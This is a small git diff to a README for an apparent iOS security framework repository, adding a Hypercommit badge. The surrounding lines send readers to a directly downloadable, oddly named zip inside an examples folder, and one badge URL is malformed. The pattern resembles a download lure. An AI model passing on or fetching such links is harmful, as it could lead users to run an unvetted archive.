@@ -3,6 +3,7 @@ https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/ma
 # iOS Enterprise Security Framework: Advanced Encryption, Certs, Compliance, Threat Detection
 
 [![Release](https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip)
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/ios-enterprise-security-framework)
 
 Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
 
